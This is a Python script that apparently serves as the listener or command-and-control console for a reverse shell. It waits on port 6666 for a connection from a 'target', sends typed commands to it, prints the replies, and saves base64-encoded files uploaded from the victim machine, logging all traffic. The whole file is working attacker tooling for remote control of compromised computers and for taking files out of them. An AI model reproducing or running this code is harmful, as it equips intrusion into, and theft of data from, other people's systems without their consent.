import socket
import base64
import os
from datetime import datetime
import threading

HOST = '0.0.0.0'
PORT = 6666
LOG_FILE = "zipo_log.txt"
DOWNLOAD_DIR = "downloads"

os.makedirs(DOWNLOAD_DIR, exist_ok=True)

def log(msg):
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}\n")

def save_file(filename, data_b64):
    try:
        now = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        safe_filename = f"{now}_{filename}"
        path = os.path.join(DOWNLOAD_DIR, safe_filename)
        with open(path, "wb") as f:
            f.write(base64.b64decode(data_b64))
        print(f"\n\033[92m[+] File saved as {path}\033[0m")
        log(f"Saved file: {path}")
    except Exception as e:
        print(f"\n\033[91m[!] Failed to save file: {e}\033[0m")
        log(f"Error saving file: {e}")

def handle_recv(conn):
    buffer = ""
    receiving_upload = False
    upload_data = ""

    while True:
        try:
            data = conn.recv(4096)
            if not data:
                print("\n\033[91m[!] Connection closed by target.\033[0m")
                break
            chunk = data.decode('utf-8', errors='ignore')

            if receiving_upload:
                upload_data += chunk
                if "::END" in upload_data:
                    try:
                        parts = upload_data.split("::", 3)
                        filename = parts[1].strip()
                        b64_data = parts[2].strip()
                        save_file(filename, b64_data)
                    except Exception as e:
                        print(f"\033[91m[!] Error decoding upload: {e}\033[0m")
                    receiving_upload = False
                    upload_data = ""
            elif chunk.startswith("[UPLOAD]::"):
                upload_data = chunk
                receiving_upload = True
            else:
                buffer += chunk
                if buffer.strip().endswith(">"):
                    print(buffer, end="")
                    log(f"RECV: {buffer.strip()}")
                    buffer = ""

        except Exception as e:
            print(f"\n\033[91m[!] Error receiving: {e}\033[0m")
            log(f"Recv error: {e}")
            break

def handle_send(conn):
    while True:
        try:
            cmd = input()
            # Удалено: if cmd.strip() == "": continue
            conn.send(cmd.encode('utf-8'))
            log(f"SEND: {cmd}")
        except KeyboardInterrupt:
            print("\n\033[93m[!] Exiting...\033[0m")
            conn.close()
            break
        except Exception as e:
            print(f"\n\033[91m[!] Error sending: {e}\033[0m")
            log(f"Send error: {e}")
            break

def main():
    print(f"\033[94m[+] Listening on port {PORT}...\033[0m")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen(1)
        conn, addr = s.accept()
        print(f"\033[92m[+] Connection from {addr}\033[0m")
        log(f"Connected from: {addr}")

        threading.Thread(target=handle_recv, args=(conn,), daemon=True).start()
        handle_send(conn)

if __name__ == "__main__":
    main()
